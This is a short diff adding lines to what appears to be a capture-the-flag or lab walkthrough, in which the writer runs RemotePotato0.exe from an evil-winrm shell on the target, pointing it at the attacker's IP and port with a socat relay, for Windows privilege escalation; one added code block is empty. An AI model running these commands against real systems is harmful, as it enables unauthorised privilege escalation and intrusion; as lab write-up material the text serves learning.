@@ -609,7 +609,15 @@ Then ill upload it to the target
 
 Ill then start socat on my machine using the target IP and a random port
 
+```python
+evil-winrm-py PS C:\Temp> .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.61 -p 9001
+```
 
+Ill then run this on the target using the remote potato binary and set the port i chose and my IP address
+
+```python
+
+```
 
 
 
